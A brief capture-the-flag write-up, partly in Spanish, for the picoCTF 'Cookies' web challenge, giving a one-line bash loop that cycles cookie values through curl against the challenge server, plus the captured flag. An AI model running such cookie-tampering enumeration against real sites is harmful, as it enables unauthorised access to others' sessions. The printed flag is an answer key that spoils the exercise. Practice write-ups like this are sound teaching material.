## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)

## Solución
```
dnightshade-picoctf@webshell:~$ for i in {1..20};do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i";done | grep pico
```

## Bandera
picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
## Notas Adicionales

## Referencias
